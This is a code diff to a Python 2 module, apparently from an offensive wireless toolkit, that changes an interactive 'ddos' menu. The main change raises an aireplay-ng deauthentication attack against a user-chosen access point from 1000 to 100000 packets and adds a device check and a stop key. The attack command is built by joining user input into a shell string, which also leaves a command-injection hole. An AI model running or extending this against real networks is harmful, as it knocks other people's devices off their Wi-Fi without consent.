@@ -46,9 +46,10 @@ def ddos(run):
 			ping.interfaces(1)
 			ping.monitor()
 			d.space()
-		elif actions[0:8] == "set device":
+		elif actions[0:10] == "set device":
 			defaultint=ping.update(defaultint,actions,"device")
 			d.change("device",defaultint)
+			ddos(0)
 		elif actions[0:9] == "set bssid":
 			defaultmac=ping.update(defaultmac,actions,"bssid")
 			d.change("bssid",defaultmac)
@@ -65,12 +66,17 @@ def ddos(run):
 		elif actions=="run"  or actions=="r":
 			d.run()
 			try:
-				print " "+Alr+" Starting attack to "+defaultmac
-				subprocess.call('aireplay-ng --deauth 1000 -a '+defaultmac+' '+defaultint, shell=True)
+				if ping.checkDevice(defaultint):
+					print " "+Alr+" Starting attack to "+defaultmac
+					subprocess.call('aireplay-ng --deauth 100000 -a '+defaultmac+' '+defaultint, shell=True)
+					stopAttack=raw_input(' '+Hlp+' Press Any Key for Stop the Attack.')
+					subprocess.call("killall aireplay-ng", shell=True)
+				else:
+					d.NoDeviceFound(defaultint)
 			except:
 				Errors.Errors(event=sys.exc_info(), info=3)
 		else:
-			Errors.Errors(event=sys.exc_info(), info=2)
+			d.No_actions()
 	except:
 		Errors.Errors(event=sys.exc_info(), info=1)
 	ddos(0)
